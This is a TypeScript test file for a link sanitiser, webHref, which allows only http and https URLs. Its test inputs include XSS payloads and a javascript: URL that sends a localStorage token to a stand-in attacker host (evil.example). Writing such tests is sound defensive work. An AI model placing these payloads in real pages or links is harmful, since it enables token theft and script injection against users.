import { describe, expect, test } from 'bun:test';
import { webHref } from './href';

describe('webHref', () => {
  test('an https url passes through unchanged', () => {
    expect(webHref('https://github.com/someone/thing')).toBe('https://github.com/someone/thing');
  });

  test('http passes too, because the catalog schema has always accepted it', () => {
    expect(webHref('http://example.com/repo')).toBe('http://example.com/repo');
  });

  test('a javascript url is refused however it is dressed up', () => {
    expect(webHref("javascript:fetch('https://evil.example/'+localStorage.getItem('t'))")).toBeNull();
    expect(webHref('JaVaScRiPt:alert(1)')).toBeNull();
    expect(webHref('  javascript:alert(1)  ')).toBeNull();
    expect(webHref('java\nscript:alert(1)')).toBeNull();
    expect(webHref('java\tscript:alert(1)')).toBeNull();
  });

  test('every other scheme that can run or embed something is refused', () => {
    expect(webHref('data:text/html,<script>alert(1)</script>')).toBeNull();
    expect(webHref('vbscript:msgbox(1)')).toBeNull();
    expect(webHref('file:///etc/passwd')).toBeNull();
    expect(webHref('blob:https://bridgething.com/abc')).toBeNull();
  });

  test('nothing at all is refused rather than rendered as an empty link', () => {
    expect(webHref(null)).toBeNull();
    expect(webHref(undefined)).toBeNull();
    expect(webHref('')).toBeNull();
    expect(webHref('   ')).toBeNull();
    expect(webHref(42 as unknown as string)).toBeNull();
  });

  test('a value with no scheme is refused rather than resolved against the page', () => {
    expect(webHref('/admin')).toBeNull();
    expect(webHref('github.com/someone/thing')).toBeNull();
    expect(webHref('//evil.example')).toBeNull();
  });

  test('the value handed back is the trimmed one, so the href matches what was checked', () => {
    expect(webHref('  https://example.com/x  ')).toBe('https://example.com/x');
  });
});
